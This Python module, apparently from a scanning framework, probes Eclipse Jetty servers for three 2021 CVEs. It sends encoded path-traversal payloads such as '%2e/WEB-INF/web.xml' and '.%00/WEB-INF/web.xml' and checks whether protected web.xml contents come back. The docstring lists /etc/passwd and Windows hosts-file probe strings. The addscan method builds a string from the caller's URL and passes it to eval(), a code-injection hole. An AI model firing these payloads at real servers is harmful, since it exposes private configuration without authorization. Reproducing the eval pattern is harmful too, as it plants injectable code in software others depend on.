#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Eclipse Jetty 是一个 Java Web 服务器和 Java Servlet 容器。 
    Jetty扫描类: 
        1. jetty 模糊路径信息泄露
            CVE-2021-28164
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-28164/

        2. jetty Utility Servlets ConcatServlet 双重解码信息泄露
            CVE-2021-28169
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-28169/

        3. jetty 模糊路径信息泄露
            CVE-2021-34429
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-34429/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class Jetty():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Jetty'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_28164_payloads = [
            {
                'path': '%2e/WEB-INF/web.xml',
                'data': ''
            },
            {
                'path': '%2e%2e/WEB-INF/web.xml',
                'data': ''
            },
        ]
        
        self.cve_2021_28169_payloads = [
            {
                'path': 'static?/%2557EB-INF/web.xml',
                'data': ''
            },
            {
                'path': 'concat?/%2557EB-INF/web.xml',
                'data': ''
            },
            {
                'path': '?/%2557EB-INF/web.xml',
                'data': ''
            },
        ]

        self.cve_2021_34429_payloads = [
                {
                    'path': '%u002e/WEB-INF/web.xml',
                    'data': ''
                },
                {
                    'path': '.%00/WEB-INF/web.xml',
                    'data': ''
                },
                {
                    'path': '..%00/WEB-INF/web.xml',
                    'data': ''
                },
            ]

    def cve_2021_28164_scan(self, url):
        ''' 默认允许请求的url中包含%2e或者%2e%2e以访问 WEB-INF 目录中的受保护资源
            例如请求 /context/%2e/WEB-INF/web.xml可以检索 web.xml 文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'DSinfo'
        vul_info['vul_id'] = 'CVE-2021-28164'
        vul_info['vul_method'] = 'GET'

        for payload in self.cve_2021_28164_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                req = requests.Request(
                    method='GET',
                    url=target,
                    headers=self.headers
                ).prepare()

                req.url = target
                session = requests.session()

                res = session.send(
                    req,
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=False,
                    allow_redirects=False
                )

                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cve_2021_28169_scan(self, url):
        ''' 在版本9.4.40、10.0.2、11.0.2 之前, ConcatServlet和WelcomeFilterJetty Servlet中的类受到"双重解码"错误的影响 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'DSinfo'
        vul_info['vul_id'] = 'CVE-2021-28169'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2021_28169_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res                  # * 会输出一个http数据包
                }
                return results

    def cve_2021_34429_scan(self, url):
        ''' CVE-2021-28164的变种和绕过
                基于 Unicode 的 URL 编码     /%u002e/WEB-INF/web.xml
                \0和 .                      /.%00/WEB-INF/web.xml
                \0和 ..                     /a/b/..%00/WEB-INF/web.xml
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'DSinfo'
        vul_info['vul_id'] = 'CVE-2021-34429'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2021_34429_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                req = requests.Request(
                    method='GET',
                    url=target,
                    headers=self.headers
                ).prepare()

                req.url = target
                session = requests.session()

                res = session.send(
                    req,
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res                  # * 会输出一个http数据包
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_28164_scan, url=url),
            thread(target=self.cve_2021_28169_scan, url=url),
            thread(target=self.cve_2021_34429_scan, url=url)
        ]

jetty = Jetty()
